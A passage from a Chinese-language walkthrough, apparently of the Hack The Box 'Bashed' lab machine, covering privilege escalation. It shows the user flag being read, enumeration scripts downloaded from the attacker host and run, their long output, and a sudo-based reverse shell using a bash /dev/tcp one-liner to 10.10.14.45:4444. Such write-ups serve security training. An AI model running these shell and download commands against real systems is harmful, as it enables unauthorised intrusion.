/home/arrexel<br>www-data@bashed:/home/arrexel$ ls -la<br>ls -la<br>total <span class="hljs-number">32</span><br>drwxr-xr-x <span class="hljs-number">4</span> arrexel arrexel <span class="hljs-number">4096</span> Jun  <span class="hljs-number">2</span>  <span class="hljs-number">2022</span> .<br>drwxr-xr-x <span class="hljs-number">4</span> root    root    <span class="hljs-number">4096</span> Dec  <span class="hljs-number">4</span>  <span class="hljs-number">2017</span> ..<br>lrwxrwxrwx <span class="hljs-number">1</span> root    root       <span class="hljs-number">9</span> Jun  <span class="hljs-number">2</span>  <span class="hljs-number">2022</span> .bash_history -&gt; /dev/null<br>-rw-r--r-- <span class="hljs-number">1</span> arrexel arrexel  <span class="hljs-number">220</span> Dec  <span class="hljs-number">4</span>  <span class="hljs-number">2017</span> .bash_logout<br>-rw-r--r-- <span class="hljs-number">1</span> arrexel arrexel <span class="hljs-number">3786</span> Dec  <span class="hljs-number">4</span>  <span class="hljs-number">2017</span> .bashrc<br>drwx------ <span class="hljs-number">2</span> arrexel arrexel <span class="hljs-number">4096</span> Dec  <span class="hljs-number">4</span>  <span class="hljs-number">2017</span> .cache<br>drwxrwxr-x <span class="hljs-number">2</span> arrexel arrexel <span class="hljs-number">4096</span> Dec  <span class="hljs-number">4</span>  <span class="hljs-number">2017</span> .nano<br>-rw-r--r-- <span class="hljs-number">1</span> arrexel arrexel  <span class="hljs-number">655</span> Dec  <span class="hljs-number">4</span>  <span class="hljs-number">2017</span> .profile<br>-rw-r--r-- <span class="hljs-number">1</span> arrexel arrexel    <span class="hljs-number">0</span> Dec  <span class="hljs-number">4</span>  <span class="hljs-number">2017</span> .sudo_as_admin_successful<br>-r--r--r-- <span class="hljs-number">1</span> arrexel arrexel   <span class="hljs-number">33</span> May <span class="hljs-number">18</span> <span class="hljs-number">23</span>:<span class="hljs-number">31</span> user.txt<br>www-data@bashed:/home/arrexel$ cat user.txt<br>cat user.txt<br>daa5414199b793a3305f56de63877587<br>www-data@bashed:/home/arrexel$ <br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>11、提权这里，是直接使用 linpeas.sh 脚本进行信息枚举</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c">www-data@bashed:/var/www/html/uploads$ wget http:<span class="hljs-comment">//10.10.14.45/linpeas.sh</span><br>wget http:<span class="hljs-comment">//10.10.14.45/linpeas.sh</span><br>-<span class="hljs-number">-2024</span><span class="hljs-number">-05</span><span class="hljs-number">-19</span> <span class="hljs-number">01</span>:<span class="hljs-number">17</span>:<span class="hljs-number">18</span>--  http:<span class="hljs-comment">//10.10.14.45/linpeas.sh</span><br>Connecting to <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.45</span>:<span class="hljs-number">80.</span>.. connected.<br>HTTP request sent, awaiting response... <span class="hljs-number">200</span> OK<br>Length: <span class="hljs-number">847920</span> (<span class="hljs-number">828</span>K) [text/x-sh]<br>Saving to: <span class="hljs-string">&#x27;linpeas.sh&#x27;</span><br><br>     <span class="hljs-number">0</span>K .......... .......... .......... .......... ..........  <span class="hljs-number">6</span>% <span class="hljs-number">29.8</span>K <span class="hljs-number">26</span>s<br>    <span class="hljs-number">50</span>K .......... .......... .......... .......... .......... <span class="hljs-number">12</span>% <span class="hljs-number">44.6</span>K <span class="hljs-number">20</span>s<br>   <span class="hljs-number">100</span>K .......... .......... .......... .......... .......... <span class="hljs-number">18</span>% <span class="hljs-number">74.1</span>K <span class="hljs-number">16</span>s<br>   <span class="hljs-number">150</span>K .......... .......... .......... .......... .......... <span class="hljs-number">24</span>% <span class="hljs-number">66.6</span>K <span class="hljs-number">13</span>s<br>   <span class="hljs-number">200</span>K .......... .......... .......... .......... .......... <span class="hljs-number">30</span>% <span class="hljs-number">56.0</span>K <span class="hljs-number">12</span>s<br>   <span class="hljs-number">250</span>K .......... .......... .......... .......... .......... <span class="hljs-number">36</span>%  <span class="hljs-number">114</span>K <span class="hljs-number">10</span>s<br>   <span class="hljs-number">300</span>K .......... .......... .......... .......... .......... <span class="hljs-number">42</span>% <span class="hljs-number">96.1</span>K <span class="hljs-number">8</span>s<br>   <span class="hljs-number">350</span>K .......... .......... .......... .......... .......... <span class="hljs-number">48</span>% <span class="hljs-number">98.7</span>K <span class="hljs-number">7</span>s<br>   <span class="hljs-number">400</span>K .......... .......... .......... .......... .......... <span class="hljs-number">54</span>%  <span class="hljs-number">124</span>K <span class="hljs-number">6</span>s<br>   <span class="hljs-number">450</span>K .......... .......... .......... .......... .......... <span class="hljs-number">60</span>%  <span class="hljs-number">105</span>K <span class="hljs-number">5</span>s<br>   <span class="hljs-number">500</span>K .......... .......... .......... .......... .......... <span class="hljs-number">66</span>% <span class="hljs-number">1.26</span>M <span class="hljs-number">4</span>s<br>   <span class="hljs-number">550</span>K .......... .......... .......... .......... .......... <span class="hljs-number">72</span>%  <span class="hljs-number">131</span>K <span class="hljs-number">3</span>s<br>   <span class="hljs-number">600</span>K .......... .......... .......... .......... .......... <span class="hljs-number">78</span>% <span class="hljs-number">1.39</span>M <span class="hljs-number">2</span>s<br>   <span class="hljs-number">650</span>K .......... .......... .......... .......... .......... <span class="hljs-number">84</span>%  <span class="hljs-number">173</span>K <span class="hljs-number">2</span>s<br>   <span class="hljs-number">700</span>K .......... .......... .......... .......... .......... <span class="hljs-number">90</span>% <span class="hljs-number">2.28</span>M <span class="hljs-number">1</span>s<br>   <span class="hljs-number">750</span>K .......... .......... .......... .......... .......... <span class="hljs-number">96</span>%  <span class="hljs-number">164</span>K <span class="hljs-number">0</span>s<br>   <span class="hljs-number">800</span>K .......... .......... ........                        <span class="hljs-number">100</span>% <span class="hljs-number">7.70</span>M=<span class="hljs-number">8.5</span>s<br><br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-19</span> <span class="hljs-number">01</span>:<span class="hljs-number">17</span>:<span class="hljs-number">28</span> (<span class="hljs-number">97.0</span> KB/s) - <span class="hljs-string">&#x27;linpeas.sh&#x27;</span> saved [<span class="hljs-number">847920</span>/<span class="hljs-number">847920</span>]<br><br>www-data@bashed:/var/www/html/uploads$ ls -la<br>ls -la<br>total <span class="hljs-number">860</span><br>drwxrwxrwx  <span class="hljs-number">2</span> root     root       <span class="hljs-number">4096</span> May <span class="hljs-number">19</span> <span class="hljs-number">01</span>:<span class="hljs-number">17</span> .<br>drw-r-xr-x <span class="hljs-number">10</span> root     root       <span class="hljs-number">4096</span> Jun  <span class="hljs-number">2</span>  <span class="hljs-number">2022</span> ..<br>-rwxrwxrwx  <span class="hljs-number">1</span> root     root         <span class="hljs-number">14</span> Dec  <span class="hljs-number">4</span>  <span class="hljs-number">2017</span> index.html<br>-rw-r--r--  <span class="hljs-number">1</span> www-data www-data <span class="hljs-number">847920</span> Dec <span class="hljs-number">27</span> <span class="hljs-number">22</span>:<span class="hljs-number">40</span> linpeas.sh<br>-rw-r--r--  <span class="hljs-number">1</span> www-data www-data  <span class="hljs-number">13585</span> Nov <span class="hljs-number">20</span>  <span class="hljs-number">2021</span> qsd-php-backdoor.php<br>www-data@bashed:/var/www/html/uploads$ <br><br>www-data@bashed:/var/www/html/uploads$ chmod +x linpeas.sh<br>chmod +x linpeas.sh<br>www-data@bashed:/var/www/html/uploads$ ./linpeas.sh<br><br>OS: Linux version <span class="hljs-number">4.4</span><span class="hljs-number">.0</span><span class="hljs-number">-62</span>-generic (buildd@lcy01<span class="hljs-number">-30</span>) (gcc version <span class="hljs-number">5.4</span><span class="hljs-number">.0</span> <span class="hljs-number">20160609</span> (Ubuntu <span class="hljs-number">5.4</span><span class="hljs-number">.0</span><span class="hljs-number">-6u</span>buntu1~<span class="hljs-number">16.04</span><span class="hljs-number">.4</span>) ) #<span class="hljs-number">83</span>-Ubuntu SMP Wed Jan <span class="hljs-number">18</span> <span class="hljs-number">14</span>:<span class="hljs-number">10</span>:<span class="hljs-number">15</span> UTC <span class="hljs-number">2017</span><br><br>https:<span class="hljs-comment">//github.com/jondonas/linux-exploit-suggester-2</span><br><br>  [<span class="hljs-number">1</span>] af_packet<br><br>      CVE<span class="hljs-number">-2016</span><span class="hljs-number">-8655</span><br>      Source: http:<span class="hljs-comment">//www.exploit-db.com/exploits/40871</span><br>  [<span class="hljs-number">2</span>] exploit_x<br>      CVE<span class="hljs-number">-2018</span><span class="hljs-number">-14665</span><br>      Source: http:<span class="hljs-comment">//www.exploit-db.com/exploits/45697</span><br>  [<span class="hljs-number">3</span>] get_rekt<br>      CVE<span class="hljs-number">-2017</span><span class="hljs-number">-16695</span><br>      Source: http:<span class="hljs-comment">//www.exploit-db.com/exploits/45010</span><br><br><br>╔══════════╣ Checking <span class="hljs-string">&#x27;sudo -l&#x27;</span>, /etc/sudoers, and /etc/sudoers.d<br>╚ https:<span class="hljs-comment">//book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid         </span><br><br>Matching Defaults entries <span class="hljs-keyword">for</span> www-data on bashed:                                        <br><br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User www-data may run the following commands on bashed:<br>    (scriptmanager : scriptmanager) NOPASSWD: ALL<br><br>uid=<span class="hljs-number">1000</span>(arrexel) gid=<span class="hljs-number">1000</span>(arrexel) groups=<span class="hljs-number">1000</span>(arrexel),<span class="hljs-number">4</span>(adm),<span class="hljs-number">24</span>(cdrom),<span class="hljs-number">27</span>(sudo),<span class="hljs-number">30</span>(dip),<span class="hljs-number">46</span>(plugdev),<span class="hljs-number">114</span>(lpadmin),<span class="hljs-number">115</span>(sambashare)<br>uid=<span class="hljs-number">1001</span>(scriptmanager) gid=<span class="hljs-number">1001</span>(scriptmanager) groups=<span class="hljs-number">1001</span>(scriptmanager)<br><br>/home/arrexel/.bash_history<br></code></pre></td></tr></table></figure>
+
+<p>12、这里我们发现，我们可以无需密码就执行 scriptmanager 用户的权限，下面我使用sudo 获取一下反弹shell吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">www-data@bashed:/var/www/html/uploads$ sudo -u scriptmanager bash -c <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.45/4444 0&gt;&amp;1&quot;</span><br>&lt;manager bash -c <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.45/4444 0&gt;&amp;1&quot;</span>                 <br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ rlwrap nc -lnvp <span class="hljs-number">4444</span><br><br>listening on [any] <span class="hljs-number">4444</span> ...<br>connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.45</span>] from (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.68</span>] <span class="hljs-number">60220</span><br>bash: cannot <span class="hljs-built_in">set</span> terminal process <span class="hljs-title function_">group</span> <span class="hljs-params">(<span class="hljs-number">821</span>)</span>: Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control in this shell<br>scriptmanager@bashed:/var/www/html/uploads$ id<br>id<br>uid=<span class="hljs-number">1001</span>(scriptmanager) gid=<span class="hljs-number">1001</span>(scriptmanager) groups=<span class="hljs-number">1001</span>(scriptmanager)<br>scriptmanager@bashed:/var/www/html/uploads$ <br></code></pre></td></tr></table></figure>
+
+<p>13、前几天通过问答社区，了解到还有一个这个工具，想着就下载下来看看，结果运行下来，好像没啥大用，没linpeas好用</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><code class="hljs c">scriptmanager@bashed:~$ wget http:<span class="hljs-comment">//10.10.14.45/lse.sh</span><br>wget http:<span class="hljs-comment">//10.10.14.45/lse.sh</span><br>-<span class="hljs-number">-2024</span><span class="hljs-number">-05</span><span class="hljs-number">-19</span> <span class="hljs-number">01</span>:<span class="hljs-number">53</span>:<span class="hljs-number">48</span>--  http:<span class="hljs-comment">//10.10.14.45/lse.sh</span><br>Connecting to <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.45</span>:<span class="hljs-number">80.</span>.. connected.<br>HTTP request sent, awaiting response... <span class="hljs-number">200</span> OK<br>Length: <span class="hljs-number">48875</span> (<span class="hljs-number">48</span>K) [text/x-sh]<br>Saving to: <span class="hljs-string">&#x27;lse.sh&#x27;</span><br><br>     <span class="hljs-number">0</span>K .......... .......... .......... .......... .......   <span class="hljs-number">100</span>% <span class="hljs-number">58.5</span>K=<span class="hljs-number">0.8</span>s<br><br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-19</span> <span class="hljs-number">01</span>:<span class="hljs-number">53</span>:<span class="hljs-number">50</span> (<span class="hljs-number">58.5</span> KB/s) - <span class="hljs-string">&#x27;lse.sh&#x27;</span> saved [<span class="hljs-number">48875</span>/<span class="hljs-number">48875</span>]<br><br>scriptmanager@bashed:~$ chmod +x lse.sh<br>chmod +x lse.sh<br>scriptmanager@bashed:~$ ./lse.sh<br>---<br>If you know the current user password, write it here to check sudo privileges: <br>---<br>                                                                                                                                                                                        <br> LSE Version: <span class="hljs-number">4.14</span>nw <br> <br>        User: scriptmanager<br>     User ID: <span class="hljs-number">1001</span><br>    Password: none<br>        Home: /home/scriptmanager<br>        Path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin<br>       umask: <span class="hljs-number">0022</span><br><br>    Hostname: bashed<br>       Linux: <span class="hljs-number">4.4</span><span class="hljs-number">.0</span><span class="hljs-number">-62</span>-generic<br>Distribution: Ubuntu <span class="hljs-number">16.04</span><span class="hljs-number">.2</span> LTS<br>Architecture: x86_64<br><br>=====================( Current Output Verbosity Level: <span class="hljs-number">0</span> )======================<br>===============================================================( humanity )=====<br>[!] nowar0 Should we question autocrats and their <span class="hljs-string">&quot;military operations&quot;</span>?... yes!<br>---<br>                                      NO   <br>                                      WAR  <br>---<br>==================================================================( users )=====<br>[i] usr000 Current user groups............................................. yes!<br>[*] usr010 Is current user in an administrative group?..................... nope<br>[*] usr020 Are there other users in administrative groups?................. yes!<br>[*] usr030 Other users with shell.......................................... yes!                                                                                                        <br>[i] usr040 Environment information......................................... skip<br>[i] usr050 Groups <span class="hljs-keyword">for</span> other users.......................................... skip                                                                                                        <br>[i] usr060 Other users..................................................... skip                                                                                                        <br>[*] usr070 PATH variables defined inside /etc.............................. yes!                                                                                                        <br>[!] usr080 Is <span class="hljs-string">&#x27;.&#x27;</span> in a PATH variable defined inside /etc?.................. nope                                                                                                        <br>===================================================================( sudo )=====<br>[!] sud000 Can we sudo without a password?................................. nope<br>[!] sud010 Can we <span class="hljs-built_in">list</span> sudo commands without a password?................... nope<br>[*] sud040 Can we read sudoers files?...................................... nope<br>[*] sud050 Do we know <span class="hljs-keyword">if</span> any other users used sudo?........................ yes!<br>============================================================( file system )=====<br>[*] fst000 Writable files outside user<span class="hljs-number">&#x27;</span>s home.............................. yes!                                                                                                        <br>[*] fst010 Binaries with setuid bit........................................ yes!<br>[!] fst020 Uncommon setuid binaries........................................ yes!                                                                                                        <br>---<br>/usr/bin/vmware-user-suid-wrapper<br>---<br>[!] fst030 Can we write to any setuid binary?.............................. nope<br>[*] fst040 Binaries with setgid bit........................................ skip<br>[!] fst050 Uncommon setgid binaries........................................ skip                                                                                                        <br>[!] fst060 Can we write to any setgid binary?.............................. skip                                                                                                        <br>[*] fst070 Can we read /root?.............................................. nope                                                                                                        <br>[*] fst080 Can we read subdirectories under /home?......................... yes!<br>[*] fst090 SSH files in home directories................................... nope<br>[*] fst100 Useful binaries................................................. yes!<br>[*] fst110 Other interesting files in home directories..................... nope<br>[!] fst120 Are there any credentials in fstab/mtab?........................ nope<br>[*] fst130 Does <span class="hljs-string">&#x27;scriptmanager&#x27;</span> have mail?................................. nope<br>[!] fst140 Can we access other users mail?................................. nope<br>[*] fst150 Looking <span class="hljs-keyword">for</span> GIT/SVN repositories................................ nope                                                                                                        <br>[!] fst160 Can we write to critical files?................................. nope<br>[!] fst170 Can we write to critical directories?........................... nope<br>[!] fst180 Can we write to directories from PATH defined in /etc?.......... nope<br>[!] fst190 Can we read any backup?......................................... nope<br>[!] fst200 Are there possible credentials in any shell history file?....... nope<br>[!] fst210 Are there NFS exports with <span class="hljs-string">&#x27;no_root_squash&#x27;</span> option?............. nope<br>[*] fst220 Are there NFS exports with <span class="hljs-string">&#x27;no_all_squash&#x27;</span> option?.............. nope<br>[i] fst500 Files owned by user <span class="hljs-string">&#x27;scriptmanager&#x27;</span>............................. skip<br>[i] fst510 SSH files anywhere.............................................. skip                                                                                                        <br>[i] fst520 Check hosts.equiv file and its contents......................... skip                                                                                                        <br>[i] fst530 List NFS server shares.......................................... skip                                                                                                        <br>[i] fst540 Dump fstab file................................................. skip                                                                                                        <br>=================================================================( system )=====                                                                                                        <br>[i] sys000 Who is logged in................................................ skip<br>[i] sys010 Last logged in users............................................ skip                                                                                                        <br>[!] sys020 Does the /etc/passwd have hashes?............................... nope                                                                                                        <br>[!] sys022 Does the /etc/group have hashes?................................ nope<br>[!] sys030 Can we read shadow files?....................................... nope<br>[*] sys040 Check <span class="hljs-keyword">for</span> other superuser accounts.............................. nope<br>[*] sys050 Can root user <span class="hljs-built_in">log</span> in via SSH?................................... nope<br>[i] sys060 List available shells........................................... skip                                                                                                        <br>[i] sys070 System umask in /etc/login.defs................................. skip                                                                                                        <br>[i] sys080 System password policies in /etc/login.defs..................... skip                                                                                                        <br>===============================================================( security )=====                                                                                                        <br>[*] sec000 Is SELinux present?............................................. nope<br>[*] sec010 List files with capabilities.................................... yes!                                                                                                        <br>[!] sec020 Can we write to a binary with caps?............................. nope<br>[!] sec030 Do we have all caps in any binary?.............................. nope<br>[*] sec040 Users with associated capabilities.............................. nope<br>[!] sec050 Does current user have capabilities?............................ skip<br>[!] sec060 Can we read the auditd <span class="hljs-built_in">log</span>?..................................... nope                                                                                                        <br>========================================================( recurrent tasks )=====<br>[*] ret000 User crontab.................................................... nope<br>[!] ret010 Cron tasks writable by user..................................... nope<br>[*] ret020 Cron jobs....................................................... yes!                                                                                                        <br>[*] ret030 Can we read user crontabs....................................... nope<br>[*] ret040 Can we <span class="hljs-built_in">list</span> other user cron tasks?.............................. nope<br>[*] ret050 Can we write to any paths present in cron jobs.................. nope<br>[!] ret060 Can we write to executable paths present in cron jobs........... skip<br>[i] ret400 Cron files...................................................... skip                                                                                                        <br>[*] ret500 User systemd timers............................................. nope                                                                                                        <br>[!] ret510 Can we write in any system timer?............................... nope<br>[i] ret900 Systemd timers.................................................. skip<br>================================================================( network )=====                                                                                                        <br>[*] net000 Services listening only on localhost............................ nope<br>[!] net010 Can we sniff traffic with tcpdump?.............................. nope                                                                                                        <br>[i] net500 NIC and IP information.......................................... skip<br>[i] net510 Routing table................................................... skip                                                                                                        <br>[i] net520 ARP table....................................................... skip                                                                                                        <br>[i] net530 Nameservers..................................................... skip                                                                                                        <br>[i] net540 Systemd Nameservers............................................. skip                                                                                                        <br>[i] net550 Listening TCP................................................... skip                                                                                                        <br>[i] net560 Listening UDP................................................... skip                                                                                                        <br>===============================================================( services )=====                                                                                                        <br>[!] srv000 Can we write in service files?.................................. nope<br>[!] srv010 Can we write in binaries executed by services?.................. nope<br>[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope<br>[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope<br>[*] srv040 Upstart files not belonging to root............................. nope<br>[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope<br>[i] srv400 Contents of /etc/inetd.conf..................................... skip                                                                                                        <br>[i] srv410 Contents of /etc/xinetd.conf.................................... skip                                                                                                        <br>[i] srv420 List /etc/xinetd.d <span class="hljs-keyword">if</span> used...................................... skip                                                                                                        <br>[i] srv430 List /etc/init.d/ permissions................................... skip                                                                                                        <br>[i] srv440 List /etc/rc.d/init.d permissions............................... skip                                                                                                        <br>[i] srv450 List /usr/local/etc/rc.d permissions............................ skip                                                                                                        <br>[i] srv460 List /etc/init/ permissions..................................... skip                                                                                                        <br>[!] srv500 Can we write in systemd service files?.......................... nope                                                                                                        <br>[!] srv510 Can we write in binaries executed by systemd services?.......... nope<br>[*] srv520 Systemd files not belonging to root............................. nope<br>[i] srv900 Systemd config files permissions................................ skip                                                                                                        <br>===============================================================( software )=====                                                                                                        <br>[!] sof000 Can we connect to MySQL with root/root credentials?............. nope<br>[!] sof010 Can we connect to MySQL as root without password?............... nope<br>[!] sof015 Are there credentials in mysql_history file?.................... nope<br>[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope<br>[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope<br>[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope<br>[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope<br>[*] sof030 Installed apache modules........................................ yes!<br>[!] sof040 Found any .htpasswd files?...................................... nope<br>[!] sof050 Are there private keys in ssh-agent?............................ nope                                                                                                        <br>[!] sof060 Are there gpg keys cached in gpg-agent?......................... nope<br>[!] sof070 Can we write to a ssh-agent socket?............................. nope<br>[!] sof080 Can we write to a gpg-agent socket?............................. nope<br>[!] sof090 Found any keepass database files?............................... nope<br>[!] sof100 Found any <span class="hljs-string">&#x27;pass&#x27;</span> store directories?............................. nope<br>[!] sof110 Are there any tmux sessions available?.......................... nope<br>[*] sof120 Are there any tmux sessions from other users?................... nope<br>[!] sof130 Can we write to tmux session sockets from other users?.......... nope<br>[!] sof140 Are any screen sessions available?.............................. nope<br>[*] sof150 Are there any screen sessions from other users?................. nope<br>[!] sof160 Can we write to screen session sockets from other users?........ nope<br>[*] sof170 Can we access MongoDB databases without credentials?............ nope<br>[!] sof180 Can we access any Kerberos credentials?......................... nope<br>[i] sof500 Sudo version.................................................... skip<br>[i] sof510 MySQL version................................................... skip                                                                                                        <br>[i] sof520 Postgres version................................................ skip                                                                                                        <br>[i] sof530 Apache version.................................................. skip                                                                                                        <br>[i] sof540 Tmux version.................................................... skip                                                                                                        <br>[i] sof550 Screen version.................................................. skip                                                                                                        <br>=============================================================( containers )=====                                                                                                        <br>[*] ctn000 Are we in a docker container?................................... nope                                                                                                        <br>[*] ctn010 Is docker available?............................................ nope<br>[!] ctn020 Is the user a member of the <span class="hljs-string">&#x27;docker&#x27;</span> group?..................... nope<br>[*] ctn200 Are we in a lxc container?...................................... nope<br>[!] ctn210 Is the user a member of any lxc/lxd group?...................... nope<br>==============================================================( processes )=====<br>[i] pro000 Waiting <span class="hljs-keyword">for</span> the process monitor to finish....................... yes!                                                                                                        <br>[i] pro001 Retrieving process binaries..................................... yes!<br>[i] pro002 Retrieving process users........................................ yes!<br>[!] pro010 Can we write in any process binary?............................. nope<br>[*] pro020 Processes running with root permissions......................... yes!<br>[*] pro030 Processes running by non-root users with shell.................. yes!                                                                                                        <br>[i] pro500 Running processes............................................... skip<br>[i] pro510 Running process binaries and permissions........................ skip                                                                                                        <br>===================================================================( CVEs )=====                                                                                                        <br>  In order to test <span class="hljs-keyword">for</span> CVEs, download lse.sh from the GitHub releases page.<br>  Alternatively, build lse_cve.sh using tools/package_cvs_into_lse.sh from the<br> repository.<br>==================================( FINISHED )==================================<br></code></pre></td></tr></table></figure>
+
+<p>14、通过枚举，发现根目录下有个脚本目录，里面有一个Python的脚本</p>
